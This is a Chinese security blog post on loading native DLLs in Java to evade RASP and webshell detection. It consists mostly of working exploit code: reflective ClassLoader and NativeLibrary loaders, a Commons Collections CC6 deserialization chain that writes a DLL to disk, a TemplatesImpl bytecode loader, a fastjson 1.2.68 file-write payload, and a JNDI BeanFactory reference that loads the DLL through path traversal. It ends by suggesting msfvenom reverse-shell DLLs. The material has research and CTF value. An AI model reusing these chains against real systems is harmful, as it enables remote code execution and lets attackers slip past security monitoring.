---
title: "java加载动态链接库绕过RASP的一些思考"
onlyTitle: true
date: 2024-12-4 11:14:21
categories:
- java
- java杂谈
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8121.jpg
---



今天在复现JNDI高版本注入用NativeLibLoader绕过的时候，由于能力有限（没有MACos系统，当不了伸手党直接复刻操作，也不会二进制），造不出类似的dll文件，msfvenom生成的dll -b参数好像也完全不起作用

https://tttang.com/archive/1489/

但是考虑了一下有其他方式写入dll，然后有任意代码执行的场景，如果目标存在webshell查杀，RASP，终端安全防护软件等安全工具，容易检测到System和Runtime的调用。这种场景下加载动态链接库就很有利用场景



## NativeLibLoader

我们先来看看最普通的利用System加载dll

```java
public class LoadTest {
    public static void main(String[] args) throws Exception{
        System.load("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\org\\exploit\\loadDLL\\calc_x64.dll");
    }
}
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202172254584.png)

load使用了Runtime load0去加载dll

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202172410148.png)

进一步跟进load0，发现调用了ClassLoader.loadLibrary

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202172513008.png)

loadLibrary中，如果绝对路径（第三个形参）为true，则直接调用loadLibrary0后返回

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202174113497.png)

在loadLibrary0中，创建了NativeLibrary，调用load去加载

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202175613656.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202175806175.png)



除了上面的用System去加载，浅蓝师傅给出的可以用`com.sun.glass.utils.NativeLibLoader`去加载动态链接库

NativeLibLoader.loadLibrary如下

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202183232840.png)

最后还是调用到了System.load

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241202183330622.png)

直接绕过System和Runtime去调用ClassLoader进行动态链接库加载

### 反射调用ClassLoader#loadLibrary

```java
public class loadLibraryToDLL {
    public static void main(String[] args) throws Exception{
        try {
            Class clazz = Class.forName("java.lang.ClassLoader");
            Method method = clazz.getDeclaredMethod("loadLibrary", Class.class, String.class, boolean.class);
            method.setAccessible(true);
            method.invoke(null, clazz, "E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\org\\exploit\\loadDLL\\calc_x64.dll", true);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

### 反射调用NativeLibrary#load

NativeLibrary是ClassLoader的内部静态匿名类

反射获取构造方法再进行实例化调用load

```java
    public static void main(String[] args) throws Exception{
        try {
            String file = "E:\\\\CODE_COLLECT\\\\Idea_java_ProTest\\\\my-yso\\\\src\\\\main\\\\java\\\\org\\\\exploit\\\\loadDLL\\\\calc_x64.dll";
            Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Constructor con = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
            con.setAccessible(true);
            Object obj = con.newInstance(Class.class,file,true);
            Method method = obj.getClass().getDeclaredMethod("load", String.class, boolean.class);
            method.setAccessible(true);
            method.invoke(obj, file, false);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
```



## CC写文件搭配字节码加载dll

由于invoke不能调用getDeclaredMethod，所以CC InvokerTransformer写文件后用TemplatesImpl字节码加载dll

先写dll：

```java
package org.exploit.CC;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Modifier;
import java.util.HashMap;
import java.util.Map;

public class CC6writeFile {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                // 第一步：创建 FileOutputStream 对象
                new ConstantTransformer(java.io.FileOutputStream.class),
                new InvokerTransformer(
                        "getConstructor",
                        new Class[]{Class[].class},
                        new Object[]{new Class[]{String.class}}
                ),
                new InvokerTransformer(
                        "newInstance",
                        new Class[]{Object[].class},
                        new Object[]{new Object[]{"CC6calc.dll"}}
                ),
                // 第二步：调用 write 方法写入数据
                new InvokerTransformer(
                        "write",
                        new Class[]{byte[].class},
                        new Object[]{readFile("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\org\\exploit\\loadDLL\\calc_x64.dll")}
                ),
                // 第三步：调用 close 方法关闭流
                new InvokerTransformer(
                        "close",
                        new Class[]{},
                        new Object[]{}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object, Object> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, new ConstantTransformer("godown"));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "test1");
        HashMap<Object, Object> hashMap = new HashMap<>();
        hashMap.put(tiedMapEntry, "test2");
        map.remove("test1");
        Class lazymapClass = lazyMap.getClass();
        Field factory = lazymapClass.getDeclaredField("factory");
        factory.setAccessible(true);
        Field modifiersField = Field.class.getDeclaredField("modifiers");
        modifiersField.setAccessible(true);
        modifiersField.setInt(factory, factory.getModifiers() & ~Modifier.FINAL);
        factory.set(lazyMap, chainedTransformer);
        serialize(hashMap);
        unserialize("cc6.ser");
    }
    public static byte[] readFile(String filePath) throws IOException {
        File file = new File(filePath);
        long fileLength = file.length();
        byte[] fileData = new byte[(int) fileLength]; // 根据文件大小创建字节数组

        try (FileInputStream fis = new FileInputStream(file)) {
            fis.read(fileData); // 读取文件内容
        }

        return fileData; // 返回字节数组
    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String filename) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename));
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```



再在字节码中加载

```java
public class TemplatesImpl_loadDLL extends AbstractTranslet {
    static{
        try {
            String file = "CC6calc.dll";
            Class a = Class.forName("java.lang.ClassLoader$NativeLibrary");
            Constructor con = a.getDeclaredConstructor(new Class[]{Class.class,String.class,boolean.class});
            con.setAccessible(true);
            Object obj = con.newInstance(Class.class,file,true);
            Method method = obj.getClass().getDeclaredMethod("load", String.class, boolean.class);
            method.setAccessible(true);
            method.invoke(obj, file, false);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }
    public TemplatesImpl_loadDLL(){}

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

![CC加载DLL](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/CC%E5%8A%A0%E8%BD%BDDLL.gif)



## 写文件搭配JNDI加载

fastjson1.2.68存在写文件，可以写dll然后搭配JNDI高版本绕过进行注入

pom

```xml
<dependency>
    <groupId>org.aspectj</groupId>
    <artifactId>aspectjtools</artifactId>
    <version>1.9.5</version>
</dependency>
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
<dependency>
    <groupId>com.sleepycat</groupId>
    <artifactId>je</artifactId>
    <version>5.0.73</version>
</dependency>
<dependency>
    <groupId>com.alibaba</groupId>
    <artifactId>fastjson</artifactId>
    <version>1.2.68</version>
</dependency>
```

注意修改position为dll解码后的字节数

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241204110613726.png)

```json
public class Fastjson_writeFile {
    public static void main(String[] args) throws Exception {
        String base64code = fileToBase64("E:\\CODE_COLLECT\\Idea_java_ProTest\\my-yso\\src\\main\\java\\org\\exploit\\loadDLL\\calc_x64.dll");
        String json = "{\n" +
                "\"stream\": {\n" +
                "\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\n" +
                "\"targetPath\": \"d:/calc_x64.dll\",\n" +
                "\"tempPath\": \"e:/test.txt\"\n" +
                "},\n" +
                "\"writer\": {\n" +
                "\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\"@type\": \"com.esotericsoftware.kryo.io.Output\",\n" +
                "\"buffer\": \""+base64code+"\",\n" +//base64文件字符串
                "\"outputStream\": {\n" +
                "\"$ref\": \"$.stream\"\n" +
                "},\n" +
                "\"position\": 50176\n" +
                "},\n" +
                "\"close\": {\n" +
                "\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\"@type\": \"com.sleepycat.bind.serial.SerialOutput\",\n" +
                "\"out\": {\n" +
                "\"$ref\": \"$.writer\"\n" +
                "}\n" +
                "}\n" +
                "}";
        JSON.parse(json);
    }
    public static String fileToBase64(String filePath) throws IOException {
        byte[] fileData = Files.readAllBytes(Paths.get(filePath));
        return Base64.getEncoder().encodeToString(fileData);
    }
}
```

JNDI：

```java
public class JNDI_loadDLL {
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(1099);
        Hashtable<String, String> env = new Hashtable<>();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=loadLibrary"));
        ref.add(new StringRefAddr("a", "../../../../../calc_x64"));
        InitialContext context = new InitialContext(env);
        context.bind("remoteImpl", ref);
    }
}
```

JNDI绕过高版本加载dll：

可以考虑直接调用NativeLibrary#load，不过间接调用了System.load和Runtime.load0，似乎没有什么用

![fastjson_jndi加载DLL](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/fastjson_jndi%E5%8A%A0%E8%BD%BDDLL.gif)



总之有写文件场景的都可以考虑一下写dll

也可以用msfvenom做反弹shell的dll或者so等进一步注入

至于dll的免杀就交给pwn手。不知道这种思路有没有利用价值（好像这种有文件落地更脑弹？），不过打CTF单纯被过滤Runtime、ProcessorBuiler等情况下还是可以考虑一下。一点自己学习的小99

